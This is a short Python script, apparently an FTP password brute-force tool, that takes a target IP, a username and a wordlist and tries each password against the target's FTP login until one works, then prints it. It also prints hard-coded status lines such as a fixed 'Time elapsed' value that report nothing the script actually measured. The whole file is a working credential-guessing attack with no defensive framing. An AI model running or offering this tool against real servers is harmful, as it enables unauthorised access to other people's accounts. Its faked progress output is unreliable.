
# -*- coding: utf-8 -*-

import sys
import argparse
import time
import ftplib 
#Arguments argparse
parser = argparse.ArgumentParser()
parser.add_argument("-ip",action="store",required=False,help="IP of target",dest="IP")
parser.add_argument("-usr",action="store",required=False,help="User of FTP",dest="USR")
parser.add_argument("-psw",action="store",required=False,help="Your wordlist",dest="PSW")
arguments = parser.parse_args()
arq = open(arguments.PSW, 'rb')
codetext = arq.readlines()
size = len(codetext)
time.sleep(1)
print("List Count: {} Type: alphanum".format(size))
time.sleep(1)
print("Scanning Complete")
time.sleep(1)
print("Time elapsed: 24.08771")

def ftp(wordlist, user, alvo):
    arq = open(wordlist, 'rb')
    for senha in arq.readlines():
        senha = senha.decode('ISO-8859-1')
        try:
            c = ftplib.FTP(alvo)
            c.login(user, senha)
            print('Password:', senha)
            break
        except ftplib.error_perm:
            print('Password: {}Incorret\n'.format(senha))



ftp(arguments.PSW,arguments.USR,arguments.IP)
